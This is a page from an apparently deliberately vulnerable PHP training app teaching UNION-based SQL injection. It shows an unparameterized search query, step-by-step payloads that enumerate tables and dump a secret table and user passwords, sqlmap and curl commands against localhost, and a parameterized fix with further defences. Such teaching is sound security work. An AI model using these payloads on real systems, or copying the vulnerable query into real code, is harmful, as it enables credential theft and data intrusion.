<?php if ( ! defined('SQL_INJECTION_IN_PHP') ) die('Direct access not permitted'); ?>

<nav aria-label="breadcrumb" class="mb-3">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="?action=walkthroughs">Walkthroughs</a></li>
    <li class="breadcrumb-item active">UNION-Based Extraction</li>
  </ol>
</nav>

<div class="d-flex align-items-center gap-3 mb-4">
  <h2 class="mb-0">2. UNION-Based Injection</h2>
  <span class="badge bg-danger">Intermediate</span>
  <span class="badge bg-secondary">Data Exfiltration</span>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Overview</strong></div>
  <div class="card-body">
    <p>UNION-based injection appends a second SELECT statement to the original query. The results of both SELECTs are returned together in the same response, allowing the attacker to read data from any table — including hidden ones like <code>secret</code> or <code>information_schema</code>.</p>
    <p class="mb-0"><strong>Affected file:</strong> <code>pages/union_search.php</code> | <strong>Column count:</strong> 7</p>
  </div>
</div>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white"><strong>Vulnerable Code</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>$search = $_GET['search'] ?? '';

// Raw input in LIKE — attacker can close the string and append UNION
$sql = "SELECT id, firstname, lastname, email, phone, password, account_type
        FROM user
        WHERE firstname LIKE '%{$search}%'";

$result = $pdo->query($sql);</code></pre>
  </div>
</div>

<div class="card mb-4 border-warning">
  <div class="card-header bg-warning text-dark"><strong>Attack Walkthrough — Step by Step</strong></div>
  <div class="card-body">

    <h6 class="fw-bold">Step 1 — Determine the number of columns</h6>
    <p>UNION requires both SELECTs to have the same number of columns. Use ORDER BY to probe:</p>
    <div class="bg-light p-2 rounded mb-1"><code>%' ORDER BY 7-- </code> → no error (7 columns OK)</div>
    <div class="bg-light p-2 rounded mb-3"><code>%' ORDER BY 8-- </code> → error (too many columns)</div>

    <h6 class="fw-bold">Step 2 — Find displayable columns</h6>
    <p>Some columns may not display. Use NULLs to find which positions echo output:</p>
    <div class="bg-light p-2 rounded mb-3"><code>%' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- </code></div>

    <h6 class="fw-bold">Step 3 — Dump the <code>secret</code> table</h6>
    <div class="bg-light p-2 rounded mb-1"><code>%' UNION SELECT id, name, filepath, 1, 1, 1, 1 FROM secret-- </code></div>
    <p class="text-muted small mb-3">The <code>secret</code> table contains sensitive file paths. The extra <code>1</code>s pad the column count to 7.</p>

    <h6 class="fw-bold">Step 4 — Enumerate all tables in the database</h6>
    <div class="bg-light p-2 rounded mb-3">
      <code>%' UNION SELECT table_name, table_schema, table_rows, 1, 1, 1, 1 FROM information_schema.tables WHERE table_schema=database()-- </code>
    </div>

    <h6 class="fw-bold">Step 5 — Enumerate columns of a specific table</h6>
    <div class="bg-light p-2 rounded mb-3">
      <code>%' UNION SELECT column_name, data_type, column_type, 1, 1, 1, 1 FROM information_schema.columns WHERE table_name='user'-- </code>
    </div>

    <h6 class="fw-bold">Step 6 — Dump all user credentials</h6>
    <div class="bg-light p-2 rounded mb-3">
      <code>%' UNION SELECT id, email, password, account_type, 1, 1, 1 FROM user-- </code>
    </div>

    <h6 class="fw-bold">Step 7 — Read DB metadata</h6>
    <div class="bg-light p-2 rounded mb-1"><code>%' UNION SELECT user(), version(), database(), 1, 1, 1, 1-- </code></div>
    <p class="text-muted small mb-3">Leaks: current DB user, MySQL version, current database name.</p>

    <a href="?action=union_search" class="btn btn-sm btn-outline-danger">Open UNION Demo Page →</a>
  </div>
</div>

<div class="card mb-4 border-success">
  <div class="card-header bg-success text-white"><strong>Fix — Parameterized Query</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>// Bind the LIKE value as a parameter — wildcards included
$stmt = $pdo->prepare(
    "SELECT id, firstname, lastname, email, phone, password, account_type
     FROM user WHERE firstname LIKE :search"
);
$stmt->execute([':search' => '%' . $search . '%']);
$result = $stmt->fetchAll();</code></pre>
    <p class="mb-0 text-success"><strong>Result:</strong> The <code>'</code> in a payload like <code>%' UNION SELECT...</code> is escaped to <code>\'</code> and treated as a literal character, not SQL syntax. The UNION never executes.</p>
  </div>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Additional Defences</strong></div>
  <div class="card-body">
    <ul class="mb-0">
      <li><strong>Column allow-listing</strong> — only expose the columns you actually need (never <code>SELECT *</code> in production).</li>
      <li><strong>Least-privilege DB user</strong> — deny <code>SELECT</code> on <code>information_schema</code> and the <code>secret</code> table from the app user.</li>
      <li><strong>WAF rules</strong> — UNION injection has a recognizable signature; a properly configured WAF adds defence-in-depth (but is not a substitute for parameterization).</li>
      <li><strong>Hide DB structure</strong> — don't use predictable table/column names. It slows down enumeration but doesn't stop a determined attacker.</li>
    </ul>
  </div>
</div>

<div class="card">
  <div class="card-header bg-secondary text-white"><strong>Tools</strong></div>
  <div class="card-body">
    <p><strong>sqlmap — auto-exploit UNION injection:</strong></p>
    <pre class="bg-light p-2 rounded small">sqlmap -u "http://localhost:8080/profile.php?action=union_search&search=test" \
  --technique=U -D sql_demo --tables --dump --batch</pre>
    <p><strong>Manual via curl:</strong></p>
    <pre class="bg-light p-2 rounded small">curl -g "http://localhost:8080/profile.php?action=union_search&search=%25'+UNION+SELECT+id,name,filepath,1,1,1,1+FROM+secret--+"</pre>
  </div>
</div>
